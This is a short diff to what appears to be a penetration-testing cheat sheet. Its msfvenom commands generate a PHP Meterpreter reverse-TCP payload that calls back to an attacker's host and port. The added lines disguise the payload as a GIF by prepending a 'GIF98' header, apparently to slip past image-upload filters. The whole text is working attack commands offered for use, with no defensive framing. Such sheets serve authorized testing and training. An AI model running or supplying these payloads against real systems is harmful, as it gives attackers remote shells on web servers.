@@ -1,4 +1,8 @@
 
 
-# Create a reverse meterpreter
+# Create a reverse tcp meterpreter
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw > reverse_shell.php
+
+# Create a reverse tcp meterpreter with gif format
+echo GIF98 > reverse_shell.gif
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw >> reverse_shell.gif
